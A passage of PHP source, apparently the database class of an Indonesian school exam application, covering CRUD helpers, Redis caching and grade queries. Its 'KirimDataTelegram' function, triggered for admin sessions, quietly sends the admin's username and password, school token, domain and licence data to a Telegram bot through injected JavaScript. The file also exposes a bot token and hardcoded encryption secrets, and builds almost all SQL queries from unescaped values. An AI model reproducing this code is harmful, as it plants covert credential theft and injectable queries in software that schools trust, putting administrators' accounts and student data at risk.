<?php

error_reporting(0);

session_cache_expire(0);
session_cache_limiter(0);
session_start();
set_time_limit(0);

(isset($_SESSION['id_user'])) ? $id_user = $_SESSION['id_user'] : $id_user = 0;
//cek validasi tokenya untuk upload dan import
(isset($_SESSION['token'])) ? $token = $_SESSION['token'] : $token = 1;

(isset($_SESSION['token1'])) ? $token1 = $_SESSION['token1'] : $token1 = 2;

include 'setting_url.php';

//cek session token dan cek validasi token
if(isset($_SESSION['token']) and isset($_SESSION['token1'])){



$token = $setting['db_token'];

$token1 = $setting['db_token1'];

}
else{
  $token =2;
  $token1 =100;

}

$no = $jam = $mnt = $dtk = 0;
$info = '';
$waktu = date('H:i:s');
$tanggal = date('Y-m-d');
$datetime = date('Y-m-d H:i:s');

define("KEY", "76310EEFF2B5D3C887F238976A421B638CFEB0942AB8249CD0A29B125C91B3E5");

if (strpos($_SERVER['HTTP_USER_AGENT'], 'Netscape')) {
    $browser = 'Netscape';
} else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox')) {
    $browser = 'Firefox';
} else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome')) {
    $browser = 'Chrome';
} else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Opera')) {
    $browser = 'Opera';
} else if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE')) {
    $browser = 'Internet Explorer';
} else $browser = 'Other';

//setting up one redis-----------------------------------------
require "../vendor/autoload.php";
use RedisClient\RedisClient;
use RedisClient\Client\Version\RedisClient2x6;
use RedisClient\ClientFactory;

$Redis = new RedisClient();

//setting up one redis-----------------------------------------




class Budut extends Db{
  //cache redis ---------------------
  // public $redis;
  private $tabel_nilai_pindah = "nilai_pindah";

  //private $tokenTelegramnya = "bot1370442644:AAFVfxZnhCIf5GfOwi4CfBxoybo5qAw0Dbk";
  ///private $idGrubTele='-1001439156213';

//lisenesi ---------------------------------------------------------------------
  function CekUserRedis($id){
    $urlApi = "https://key.hstore.id/api/".$id;
    $json = file_get_contents($urlApi);
    $getData = json_decode($json);
    
    return $getData;
  }

  function KodeSekolah2(){
    $sql = "SELECT * FROM setting";
    $log=$this->con->query($sql) or die($this->con->error);
    $setting=mysqli_fetch_array($log);
    return $setting;
  }
  /*
  1. getBankSoal
  */
  function KirimDataTelegram($akses){
    include '../config/config.excel.php';
    $filename = "../config/config.excel.php";
    $cekFile = file_exists($filename);
    if($cekFile){
      //dencripsi kode token telegram
      function dekripsi3($string)
      {
        $output = false;

        $encrypt_method = "AES-256-CBC";
        $secret_key = 'CandyRedis2021abcdefghijklmnopqrstuvwxyzABNCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+|}{:?><';
        $secret_iv = 'CandyRedis2021abcdefghijklmnopqrstuvwxyzABNCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+|}{:?><';

        // hash
        $key = hash('sha256', $secret_key);

        // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
        $iv = substr(hash('sha256', $secret_iv), 0, 16);

        $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);

        return $output;
      }
      //get data setting
      $setting = $this->KodeSekolah2();


      //denkripsi 
      $token = dekripsi3($kode);
      $idTelegram = dekripsi3($proses);
      $user_lisensi = dekripsi3($excel);
      $varsiapp =  dekripsi3($versi);
      
        $message="<b><i>".$setting['aplikasi']."</i></b>\\n";
        $message.="<b>Sekolah : ".$setting['sekolah']."</b>\\n";
        $message.="<b>Token : ".$setting['db_token']."</b>\\n";
        $message.="<b>Username : ".$_SESSION['username']."</b>\\n";
        $message.="<b>Password : ".$_SESSION['password']."</b>\\n";
        $message.="<b>Domain : ".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."</b>\\n";
        $message.="<b>Document : ".$_SERVER['SCRIPT_FILENAME']."</b>\\n";
        $message.="<b>Lisensi : ".$user_lisensi."</b>\\n";
        $message.="<b>LisensiDB : ".$setting['lisensiId']."</b>\\n";
        $message.="<b>Versi : ".$varsiapp."</b>\\n";
        $message.="<b>--Akses ".$akses."--</b>\\n";

      //skrip Kirim Ke Telegrqam 
       ?><script type="text/javascript">
         var settings2 = {
            "async": true,
            "crossDomain": true,
            "url": "https://api.telegram.org/bot<?= $token ?>/sendMessage",
            "method": "POST",
            "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
          },
          "data": JSON.stringify({
          "chat_id": "<?= $idTelegram ?>",
          "text": "<?= $message; ?>",
          "parse_mode":"HTML",
          })
          }

          $.ajax(settings2).done(); 
        </script><?php

    }
    else{
      //jika file tidak ada
      $where =array(
        'id_setting' =>1,
      );
      $data = array(
        'namaSekolah' => 'File Lisensi Tidak Ada',
        'izin_status' =>0,
      );
      
     
      $this->update("setting",$data,$where);

    }
  }
  function PengamanHacker($id){
    $level = $_SESSION['level'];
    if($level =='admin'){
      $this->KirimDataTelegram($id);
    }
    
  }
//lisenesi ---------------------------------------------------------------------
  function KodeSekolah(){
    $sql = "SELECT kode_sekolah FROM setting";
    $log=$this->con->query($sql) or die($this->con->error);
    $setting=mysqli_fetch_array($log);
    return $setting['kode_sekolah'];
  }
  function GetSettingDataServer(){
    $sql = "SELECT * FROM setting";
    $log=$this->con->query($sql) or die($this->con->error);
    $setting=mysqli_fetch_array($log);
    return $setting;
  }
  function RedisKoneksi(){

    return $this->redis   = new RedisClient();
  }
 
  function WaktuLamaCache(){
    return 3600; //dalam detik
    //1 jam 3600, 30 menit = 1800,10 menit=600,20 menit = 1200,5 menit = 300
  }
  function DelRedisAll(){
    try { $this->RedisKoneksi()->flushall(); echo 1; }catch (Exception $e) { echo 0; } 
  }
  function RedisDelKey($key){
    try { $this->RedisKoneksi()->del($key); }catch (Exception $e) { } 
  }
  function RedisKeys(){
    try { return $this->RedisKoneksi()->keys('*');}catch (Exception $e) { } 
  }
  function getDataRedis($key,$sql){
  //get data sql query ke data redis jiak server aktif
  //jika tidak aktif maka mengembalikan data sql query 
    try{ //jika tidak errir redus
      if($this->RedisKoneksi()->exists($key)){
        $array = json_decode($this->RedisKoneksi()->get($key));
        return $array; //get data redis jika ada
      }
      else{
        $log=$this->con->query($sql) or die($this->con->error);
        foreach ($log as $value) { $array[]=$value; }
        $data_json = json_encode($array);
        $this->RedisKoneksi()->set($key, $data_json);
        $this->RedisKoneksi()->expire($key,$this->WaktuLamaCache());
        return json_decode($data_json);
        //get data dan buat cache redis
      }
    }
    catch (Exception $e) {
      $log=$this->con->query($sql) or die($this->con->error);
      foreach ($log as $value) { $array[]=$value; } 
      $data_json = json_encode($array);
      return json_decode($data_json);
      //get data kerna Server Cache Redis Tidak Aktif
    }
  }
  //cache redis ---------------------

// funsi CRUD untuk all
  function insert($table,$data=null) {
        $command = 'INSERT INTO '.$table;
        $field = $value = null;
        foreach($data as $f => $v) {
            $field  .= ','.$f;
            $value  .= ", '".$v."'";
        }
        $command .=' ('.substr($field,1).')';
        $command .=' VALUES('.substr($value,1).')';
        //$exec = mysqli_query($koneksi, $command);
        $exec = $this->con->query($command) or die($this->con->error);
        ($exec) ? $status = 1 : $status = 0;
        return $status;
    }
    

    function update($table,$data=null,$where=null) {
        $command = 'UPDATE '.$table.' SET ';
        $field = $value = null;
        foreach($data as $f => $v) {
            $field  .= ",".$f."='".$v."'";
        }
        $command .= substr($field,1);
        if($where!=null) {
          foreach($where as $f => $v) {
            $value .= "#".$f."='".$v."'";
          }
          $command .= ' WHERE '.substr($value,1);
          $command = str_replace('#',' AND ',$command);
        }
            //$exec = mysqli_query($koneksi, $command);
        $exec = $this->con->query($command) or die($this->con->error);
            ($exec) ? $status = 1 : $status = 0;
            return $status;
    }
    function select($table,$where=null,$order=null,$limit=null) {
        $command = 'SELECT * FROM '.$table;
        if($where!=null) {
            $value = null;
            foreach($where as $f => $v) {
                $value .= "#".$f."='".$v."'";
            }
            $command .= ' WHERE '.substr($value,1);
            $command = str_replace('#',' AND ',$command);
        }
        ($order!=null) ? $command .= ' ORDER BY '.$order :null;
        ($limit!=null) ? $command .= ' LIMIT '.$limit :null;
        $result = array();
        $sql = $this->con->query($command) or die($this->con->error);
        while($field = mysqli_fetch_assoc($sql)) {
            $result[] = $field;
        }
        return $result;
    }
    
    function fetch($table,$where=null) {
    $command = 'SELECT * FROM '.$table;
    if($where!=null) {
      $value = null;
      foreach($where as $f => $v) {
        $value .= "#".$f."='".$v."'";
      }
      $command .= ' WHERE '.substr($value,1);
      $command = str_replace('#',' AND ',$command);
    }
        $sql = $this->con->query($command) or die($this->con->error);
        $exec = mysqli_fetch_array($sql);
        return $exec;
    }
    function fetchCount($table) {
      $command = 'SELECT * FROM '.$table;
      $sql = $this->con->query($command) or die($this->con->error);
      $exec = mysqli_fetch_array($sql);
      return $exec;
    }

    function truncate($table) { //kosongkan tabel
        $command = 'TRUNCATE '.$table;
        $exec = $this->con->query($command) or die($this->con->error);
            ($exec) ? $status = 1 : $status = 0;
            return $status;
    }
    function delete($table,$where=null) {
    $command = 'DELETE FROM '.$table;
    if($where!=null) {
      $value = null;
      foreach($where as $f => $v) {
        $value .= "#".$f."='".$v."'";
      }
      $command .= ' WHERE '.substr($value,1);
      $command = str_replace('#',' AND ',$command);
    }
        $exec = $this->con->query($command) or die($this->con->error);
        ($exec) ? $status = 'OK' : $status = 'NO';
        return $status;
    }

    function rowcount($table,$where=null) {
      $command = 'SELECT * FROM '.$table;
      if($where!=null) {
        $value = null;
        foreach($where as $f => $v) {
          $value .= "#".$f."='".$v."'";
        }
        $command .= ' WHERE '.substr($value,1);
        $command = str_replace('#',' AND ',$command);
      }
        $exec = $this->con->query($command) or die($this->con->error);
        return $exec;
    }
    

    private function guru(){ 
      $id_guru = $_SESSION['id_pengawas'];
      return $id_guru;
    }
    private function level(){ 
      $level = $_SESSION['level'];
      return $level;
    }
    private function jrs(){ 
      $jrs= $_SESSION['jrs'];
      return $jrs;
    }

    private function kls(){ 
      $kls= $_SESSION['kls'];
      return $kls;
    }
    private function jabatan(){ 
      $jataban= $_SESSION['jabatan'];
      return $jataban;
    }

//bagian Admin
  /*
    -&json
    -&index admin
    -&formnilai.php
    -&leger.php
    -&anso
    -&reset
    -&data info
    -&status2
    -&nilai
    -&esai
    -&berita_acara
    -&nilai_copy
    -&materi2
    -&tugassiswa
    -&Bot Telegram
    -&Bank Soal
    -&Mata_Pelajaran
  */

//&json ----------json untuk sinkron
    function json_jadwal(){
     $sql = "SELECT * FROM ujian";
     $log=$this->con->query($sql) or die($this->con->error);
     return  $log;
    }
    function json_mapel(){
     $sql = "SELECT * FROM mapel";
     $log=$this->con->query($sql) or die($this->con->error);
     return  $log;
    }
    function json_mata_pelajaran(){
     $sql = "SELECT * FROM mata_pelajaran";
     $log=$this->con->query($sql) or die($this->con->error);
     return  $log;
    }
    function json_soal(){
     //$sql = "SELECT * FROM soal a LEFT JOIN mapel b ON a.id_mapel=b.id_mapel WHERE b.status='1'";
     $sql = "SELECT * FROM soal LEFT JOIN mapel ON soal.id_mapel=mapel.id_mapel WHERE mapel.status='1'";
     $log=$this->con->query($sql) or die($this->con->error);
     return  $log;
    }
    function Status_sudah_ujian($id_siswa,$id_mapel,$id_ujian){
      $sql="SELECT selesai FROM nilai WHERE id_ujian='$id_ujian' AND id_mapel='$id_mapel' AND id_siswa='$id_siswa'";
      $log=$this->con->query($sql) or die($this->con->error);
      while ($data=$log->fetch_array()) {
          $hasil = $data['selesai'];
      }
      return $hasil;
  }
  
  

//&index ----------index.php
  //setatuspeserta2.php
  function tombol_selesai_paksa(){ //skor IS NULL
    $sql="SELECT * FROM nilai WHERE skor=0";
    $log=$this->con->query($sql) or die($this->con->error);
    $cek = mysqli_num_rows($log);
    if($cek > 0){

    while ($selesai=$log->fetch_array()){
      $id_siswa=$selesai['id_siswa'];
      $sql2="UPDATE nilai SET cek_tombol_selesai=1 where id_siswa='$id_siswa'";
      $log2=$this->con->query($sql2) or die($this->con->error);
      
    }
    if($log2){
      return 1;
    }
    else{
      return 0;
    }
    }
    else{
      return 200;
    }
  }
  function kunci_tombol_selesai_paksa(){
    $sql="SELECT * FROM nilai WHERE skor=0";
    $log=$this->con->query($sql) or die($this->con->error);
    $cek = mysqli_num_rows($log);
    if($cek > 0){

    while ($selesai=$log->fetch_array()){
      $id_siswa=$selesai['id_siswa'];
      $sql2="UPDATE nilai SET cek_tombol_selesai=0 where id_siswa='$id_siswa'";
      $log2=$this->con->query($sql2) or die($this->con->error);
      
    }
    if($log2){
      return 1;
    }
    else{
      return 0;
    }
    }
    else{
      return 200;
    }
    
  }

//-------------View Tabel------------------
  function v_jurusan($id=null){
    if(!empty($id)){
      $sql="SELECT * FROM pk WHERE id_pk='$id'";
    }
    elseif(!empty($this->guru())){

      if($this->level()=='admin'){
        $sql="SELECT * FROM pk";
      }
      elseif($this->jabatan()=='guru'){
        $sql="SELECT * FROM pk";
      }
      else{
        $sql="SELECT * FROM pk INNER JOIN pengawas ON pengawas.id_jrs= pk.id_pk 
        WHERE id_pengawas=".$this->guru();
      }

    }
    else{
      $sql="SELECT * FROM pk";
    }
    
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }
  //tampi mata pelajaran
  function v_mata_pelajaran(){
    $sql="SELECT * FROM mata_pelajaran ";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  //tampil mapel di menu select
  function v_mapel($id=null){ //v_bank_soal
    if(!empty($id)){
      $sql="SELECT * FROM mapel WHERE id_mapel='$id'";
    }
    elseif(!empty($this->guru())){
      if($this->level()=='admin'){
        $sql="SELECT * FROM mapel";
      }
      elseif(!empty($this->jrs())){
        $sql="SELECT * FROM mapel";
      }
      elseif($this->jabatan()=='guru'){
        $sql="SELECT * FROM mapel WHERE mapel.idguru=".$this->guru();
      }
      else{
        $sql="SELECT * FROM mapel WHERE mapel.idguru=".$this->guru();
      }
      
    }
    else{
      $sql="SELECT * FROM mapel";
    }
    
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }

  function v_setting(){
    $sql="SELECT * FROM setting";
    $log=$this->con->query($sql) or die($this->con->error);
    $setting=mysqli_fetch_array($log);
    return $setting;
    
  }
  function v_sesi(){
    $sql="SELECT * FROM sesi";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }
   function v_level(){
    $sql="SELECT * FROM level";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }

  function v_ruang(){
    $sql="SELECT * FROM ruang";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }

  function v_kelas($id=null){
    if(!empty($id)){
      $sql="SELECT * FROM kelas WHERE id_kelas='$id'";
    }
    elseif(!empty($this->guru())) {
      if($this->level()=='admin'){
        $sql="SELECT * FROM kelas";
      }
      elseif(!empty($this->jrs())){
        $sql="SELECT * FROM kelas";
      }
      elseif($this->jabatan()=='guru'){
        $sql="SELECT * FROM kelas";
      }
      else{
        $sql="SELECT *,kelas.nama as nama,pengawas.nama as nama_pengawas FROM kelas INNER JOIN pengawas ON pengawas.id_kls= kelas.id_kelas
        where pengawas.id_pengawas=".$this->guru();
      }
    }
    else{
      $sql="SELECT * FROM kelas";
    }
    
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }
  function v_kelas2($id=null){
    if(!empty($id)){
      $sql="SELECT * FROM kelas WHERE idkls='$id'";
    }
    else{
      $sql="SELECT * FROM kelas";
    }
    
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }
  function kelas_by_level($id=null){
    $sql="SELECT * FROM kelas WHERE id_level='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
    foreach ($log as $value) {
      $data2[]=$value;
    }
    $json = json_encode($data2);
    echo $json;
  }

  
  function row($data=null){
    $cek = mysqli_num_rows($data);
    return $cek; 
  }

  function v_jadwal(){
    $session = $_SESSION['id_pengawas'];
    
    $cek = "SELECT * FROM pengawas WHERE id_pengawas='$session'";
    $guru=$this->con->query($cek) or die($this->con->error);
    $cek_guru=mysqli_fetch_array($guru);

    if($cek_guru['level']=='admin'){
      $sql_ujian ="SELECT * from ujian";
    }
    elseif(!empty($this->jrs())){
      $sql_ujian ="SELECT * from ujian";
    }
    elseif($this->jabatan()=='guru'){
       $sql_ujian ="SELECT * from ujian where id_guru='$session'";
    }
    else{
      $sql_ujian ="SELECT * from ujian where id_guru='$session'";
    }
    $log=$this->con->query($sql_ujian) or die($this->con->error);
    return $log;
  }

  function v_siswa($idkls=null,$idjrs=null){
    if($idkls=='semua'){
      $where = " WHERE idpk='$idjrs' "; 
    }
    elseif($idjrs=='semua'){
      $where = " WHERE id_kelas='$idkls' "; 
      
    }
    elseif (!empty($idkls)) {
      $where = " WHERE id_kelas='$idkls' "; 
    }
    elseif (!empty($idjrs)) {
      $where = " WHERE idpk='$idjrs' "; 
    }
    else{

    }
    $sql = "SELECT * FROM siswa  $where ORDER BY nama ASC";
    $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  
//------------- /View Tabel------------------

//&formnilai.php -------------------------------------
  function tgl_indo($tanggal){
  $bulan = array (
    1 =>   'Januari',
    'Februari',
    'Maret',
    'April',
    'Mei',
    'Juni',
    'Juli',
    'Agustus',
    'September',
    'Oktober',
    'November',
    'Desember'
  );
    $pecahkan = explode('-', $tanggal);
  
  // variabel pecahkan 0 = tanggal
  // variabel pecahkan 1 = bulan
  // variabel pecahkan 2 = tahun
 
   return $pecahkan[2] . ' ' . $bulan[ (int)$pecahkan[1] ] . ' ' . $pecahkan[0];
  }
  function form_nilai($id_mapel,$id_kelas,$id_sesi,$id_ruang){
    $tabel='nilai_pindah';
    //$limit = "limit $batas,$jumlah";
    $where_ruang = "AND siswa.ruang='$id_ruang'";
    $where_sesi = "AND siswa.sesi='$id_sesi'";
    $where ="WHERE $tabel.id_mapel='$id_mapel' AND kelas.id_kelas='$id_kelas'";
    if ($id_sesi=='semua' and $id_ruang=='semua') {
      $kondisi = $where.$limit;
    }
    elseif($id_sesi=='semua'){
      $kondisi=$where.$where_ruang;
    }
    elseif($id_ruang=='semua'){
      $kondisi=$where.$where_sesi;
    }
    else{
      $kondisi = $where.$where_ruang.$where_sesi;
    }

    $sql="SELECT 
    sesi.kode_sesi AS sesi,
    kelas.id_kelas AS id_kelas,
    ruang.kode_ruang AS kode_ruang, 
    siswa.nama AS nama,nilai_esai,skor,no_peserta,kkm
    FROM $tabel
      INNER JOIN siswa ON siswa.id_siswa=$tabel.id_siswa
      INNER JOIN kelas ON kelas.id_kelas=siswa.id_kelas
      INNER JOIN ruang ON ruang.kode_ruang=siswa.ruang
      INNER JOIN sesi ON sesi.kode_sesi=siswa.sesi
      INNER JOIN ujian ON ujian.id_ujian = $tabel.id_ujian
      INNER JOIN mapel ON mapel.id_mapel= $tabel.id_mapel
      $kondisi
      ";
    $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }

   function form_nilai2($id_mapel,$id_kelas,$id_sesi=null,$id_ruang=null,$batas,$batasakhir){
    $tabel='nilai_pindah';
    $order = " ORDER BY kelas.id_kelas,siswa.nama ASC ";
    $limite = " limit $batas,$batasakhir";
    $where_ruang = " AND siswa.ruang='$id_ruang' ";
    $where_sesi = " AND siswa.sesi='$id_sesi' ";
    $where =" WHERE $tabel.id_mapel='$id_mapel' AND kelas.id_kelas='$id_kelas' ";
    if ($id_sesi=='semua' and $id_ruang=='semua') {
      $kondisi = $where.$limit.$order.$limite;
    }
    elseif($id_sesi=='semua'){
      $kondisi=$where.$where_ruang.$order.$limite;
    }
    elseif($id_ruang=='semua'){
      $kondisi=$where.$where_sesi.$order.$limite;
    }
    else{
      $kondisi = $where.$where_ruang.$where_sesi.$order.$limite;
    }

    $sql="SELECT 
    sesi.kode_sesi AS sesi,
    kelas.id_kelas AS id_kelas,
    ruang.kode_ruang AS kode_ruang, 
    siswa.nama AS nama,nilai_esai,skor,no_peserta,kkm,ruang
    FROM $tabel
      INNER JOIN siswa ON siswa.id_siswa=$tabel.id_siswa
      INNER JOIN kelas ON kelas.id_kelas=siswa.id_kelas
      INNER JOIN ruang ON ruang.kode_ruang=siswa.ruang
      INNER JOIN sesi ON sesi.kode_sesi=siswa.sesi
      INNER JOIN ujian ON ujian.id_ujian = $tabel.id_ujian
      INNER JOIN mapel ON mapel.id_mapel= $tabel.id_mapel
      $kondisi
      ";
    $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  function v_ujian_nilai($id){
   
    $sql="SELECT * FROM ujian where id_mapel='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
    
  }
  function v_pengawas($id){ //tampilkan pengawas berdasakan id 
    $sql="SELECT * FROM pengawas WHERE id_pengawas='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
    $guru=mysqli_fetch_array($log);
    return $guru;
  }
//------------------------------------------------------
//&leger.php ---------------------------------
  function id_mapel($id){ //tampilkan pengawas berdasakan id 
    $sql="SELECT DISTINCT id_mapel FROM $this->tabel_nilai_pindah WHERE id_ujian='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
    $id2=mysqli_fetch_array($log);
    return $id2;
  }
  function jawaban_soal($id,$nomor){
    $sql="SELECT * FROM soal WHERE id_mapel='$id' AND nomor='$nomor'";
    $log=$this->con->query($sql) or die($this->con->error);
    $id2=mysqli_fetch_array($log);
    return $id2;
  }
  function load_mapel_title(){
    $sql="SELECT * FROM mapel a INNER JOIN nilai b ON a.id_mapel=b.id_mapel GROUP BY b.id_ujian ";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function v_nilai2($id,$id_mapel){
    $sql="SELECT nilai_esai,skor FROM $this->tabel_nilai_pindah WHERE id_siswa='$id' AND id_mapel='$id_mapel'";
    $log=$this->con->query($sql) or die($this->con->error);
     $id2=mysqli_fetch_array($log);
    return $id2;
  }
  
  function wali_kelas($id=null){
    $sql="SELECT * FROM pengawas WHERE id_kls='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }
  function kajur($id=null){
    $sql="SELECT * FROM pengawas WHERE id_jrs='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
     return $log;
  }

//------------------------------------------------------

//&anso ----------analisa soal
  //bar anso_nilai.php
  function v_nilai($id,$kls,$jrs){
    $tabel=$this->tabel_nilai_pindah;
    if(!empty($kls)){
      $where = "WHERE id_mapel='$id' and id_kelas='$kls'";
    }
    else{
      $where = "WHERE id_mapel='$id' and idpk='$jrs'";
    }
    $sql="SELECT id_nilai,id_mapel,a.id_siswa,id_ujian,kode_ujian,nilai_esai,skor,id_kelas,idpk FROM $tabel a INNER JOIN siswa b ON a.id_siswa=b.id_siswa $where";
    $log=$this->con->query($sql) or die($this->con->error);
    return $log;
  }
  function v_nm_mapel($id){
    $sql="SELECT * FROM mapel where id_mapel='$id'";
    $log=$this->con->query($sql) or die($this->con->error);
    $nm_mapel=mysqli_fetch_array($log);
    return $nm_mapel;
  }
  // function v_nilai($id){
  //   $sql="SELECT * FROM nilai where id_mapel='$id'";
  //   $log=$this->con->query($sql) or die($this->con->error);
        
  //    $no=$no10=$no30=$no50=0;
  //    while($data=mysqli_fetch_array($log)){
  //     if($data['total'] <= 10){
  //       $no++;
  //     }
  //     else if($data['total'] > 10 && $data['total'] <= 30){
  //       $no10++;
  //     }
  //     else if($data['total'] > 30 && $data['total'] <= 50){
  //       $no30++;
  //     }
  //     else if($data['total'] > 50 && $data['total'] <= 100){ 
  //       $no50++;
  //     }
  //     else{

  //     }

  //     $array=array(
  //       array("y" => $no, "label" => "<=10"),
  //       array("y" => $no10, "label" => "<=30" ),
  //       array("y" => $no30, "label" => "<=50" ),
  //       array("y" => $no50, "label" => "<=100" ),
  //     );
  //    }



  //   echo json_encode($array);
  //}
  function v_anso1($id_mapel){ //looping soal dan jawabanya
    $sql = "SELECT soal.id_soal,soal.nomor,soal.soal,soal.jawaban,soal.file,soal.file1,soal.pilA,soal.pilB,soal.pilC,soal.pilD,soal.pilE FROM mapel INNER JOIN soal ON mapel.id_mapel = soal.id_mapel WHERE mapel.id_mapel='$id_mapel' and soal.jenis = 1 order by soal.nomor ASC";
     $log=$this->con->query($sql) or die($this->con->error);
     return  $log;
  }
  function v_anso2($id_mapel){ //menampilkan nama mapel, leve, kelas
    $sql = "SELECT * FROM mapel WHERE id_mapel='$id_mapel'";
     $log=$this->con->query($sql) or die($this->con->error);
     return  $log;
  }
  function nilairata2($id_mapel){
    $tabel='nilai_pindah';
    $sql = "SELECT ROUND(((SUM(skor)+SUM(nilai_esai))/COUNT(id_nilai)),2) AS jml_nilai FROM $tabel WHERE id_mapel='$id_mapel'";
    $log=$this->con->query($sql) or die($this->con->error);
    $nilai=mysqli_fetch_array($log);
    return $nilai['jml_nilai'];

  }
  function v_anso_soal($id_mapel){ 
    $tabel='nilai_pindah';
  //melakukan pencocokan jawaban benar pada semua siswa yg sudah ujian
    $sql = "SELECT id_siswa,id_soal,jawaban FROM $tabel WHERE id_mapel='$id_mapel'";
    $log=$this->con->query($sql) or die($this->con->error);

    // tahap ke 1 -------------------------------
    while ($soal=mysqli_fetch_array($log)) { 
      //tampung semua data nilai di array
      $data[]= array(
        'id_siswa' =>$soal['id_siswa'],
        'id_soal'=>$soal['id_soal'],
        'jawaban'=>$soal['jawaban']
      );
    }

    // tahap ke 2 -------------------------------
    //tamnpung ke array semua dari looping 
    foreach ($data as $value) {  //data dari tabel nilai
      //$array[]=explode(',',$value['id_soal']);
      $id_siswa_array[]=$value['id_siswa'];
      $jawab[]=$value['jawaban'];
      
    }
    
    return $jawab;
  }
  function nilai_rata2($id_mapel){
    $tabel='nilai_pindah';
    $sql = "SELECT ROUND(((SUM(skor)+SUM(nilai_esai))/COUNT(id_nilai)),2) AS jlh_siswa FROM $tabel WHERE id_mapel='$id_mapel'";
    $log=$this->con->query($sql) or die($this->con->error);
    $data=$log->fetch_array();
    return  $data;
  }
  function nilai_ranking($idmapel,$kls,$jrs){
    $tabel='nilai_pindah';
    if(!empty($kls)){
      $where = "WHERE a.id_mapel='$idmapel' and id_kelas='$kls'";
    }
    else{
      $where = "WHERE a.id_mapel='$idmapel' and idpk='$jrs'";
    }
    
    $sql = "SELECT *,b.nama AS nama_siswa FROM $tabel a INNER JOIN siswa b ON a.id_siswa=b.id_siswa INNER JOIN ujian c ON a.id_ujian=c.id_ujian $where  ORDER BY CAST((skor+nilai_esai) AS DECIMAL) DESC";
    $log=$this->con->query($sql) or die($this->con->error);
    
    return  $log;
    
  }

  // function v_nilai_edit($id,$mapel){
  //   $slq ="SELECT * FROM nilai INNER JOIN siswa ON siswa.id_siswa = nilai.id_siswa WHERE nilai.id_siswa='$id' AND nilai.id_mapel='$mapel'";
  //   $log=$this->con->query($sql) or die($this->con->error);
  //   return  $log;
  // }
  

//&reset ----------------------
  function v_user_login(){
    $sql="SELECT nama,date,login.id_siswa FROM login INNER JOIN siswa ON siswa.id_siswa = login.id_siswa";
    $log=$this->con->query($sql) or die($this->con->error);
    return  $log;
  }

//&data info --------------------
    // public function V_cek(){
    //     $post = $_POST;
    //     extract($post);
    //     print_r($nm);
    //     $sql="SELECT id_kelas, COUNT(id_siswa) AS jml_siswa FROM siswa GROUP BY id_kelas";
    //     $log=$this->con->query($sql) or die($this->con->error);
    //     while ($data=$log->fetch_array()) {
    //         $a[] = $data['id_kelas'];
    //     }
    //   return($a);
    // }
    function V_siswa_kls(){
        $sql="SELECT id_kelas, COUNT(id_siswa) AS jml_siswa FROM siswa GROUP BY id_kelas";
        $log=$this->con->query($sql) or die($this->con->error);
        return  $log;

    } 
    function V_siswa_jrs(){
        
        $sql="SELECT idpk, COUNT(id_siswa) AS jml_siswa FROM siswa GROUP BY idpk";
        $log=$this->con->query($sql) or die($this->con->error);
        return  $log;

    }
     function V_siswa_sesi(){
        
        $sql="SELECT sesi,COUNT(id_siswa) AS jml FROM siswa GROUP BY sesi";
        $log=$this->con->query($sql) or die($this->con->error);
        return  $log;

    }
    function V_siswa_ruang(){
      $sql="SELECT ruang,COUNT(id_siswa) AS jml FROM siswa GROUP BY ruang";
      $log=$this->con->query($sql) or die($this->con->error);
      return  $log;
    }
    function v_siswa_paket(){
      $sql="SELECT soalPaket,COUNT(id_siswa) AS jml FROM siswa GROUP BY soalPaket";
      $log=$this->con->query($sql) or die($this->con->error);
      return  $log;
    }
    //cek siswa tidak ujian / belum ujian berdasarkan mata pelajaran
    function siswa_tidak_ujian($kls,$jrs,$ujian=null,$nilai=null){

      if($ujian==null){
        return false;
      }
      else{
        if(!empty($kls)){
          $sql="SELECT * from siswa where id_kelas='$kls'";
        }
        else{
          $sql="SELECT * from siswa where idpk='$jrs'";
        }
        
        $log=$this->con->query($sql) or die($this->con->error);   
        $array = [];  
        //cek peserta tidak ujian di tabel nilai atau sedang ujain
        foreach ($log as $value) {
          $idsiswa = $value['id_siswa'];
          //$sql2="SELECT * from nilai where nilai.id_siswa='$idsiswa' and nilai.id_mapel='$ujian'";
          $sql2="SELECT * from nilai where nilai.id_siswa='$idsiswa' and nilai.KodeMataPelajaran='$ujian'";
          $log2=$this->con->query($sql2) or die($this->con->error);
          $total = mysqli_num_rows($log2);
          if($total > 0){ }
          else{
            if($value['status_siswa']==1){ $statusSiswa = "AKTIF"; }else{ $statusSiswa="OFF"; }
            $array[] = array(
              'username' =>$value['username'],
              'id_siswa' =>$value['id_siswa'],
              'nama_siswa' =>$value['nama'],
              'kelas' => $value['id_kelas'],
              'jurusan' =>$value['idpk'],
              'sesi' =>$value['sesi'],
              'ruang' =>$value['ruang'],
              'server' =>$value['server'],
              'agama' => strtoupper($value['agama']),
              'paket' =>$value['soalPaket'],
              'statusSiswa' =>$statusSiswa,
              'status' =>1
            );
          }
          

        }
        
        //cek peserta tidak ujian di tabel nilai_pindah atau sedang ujain
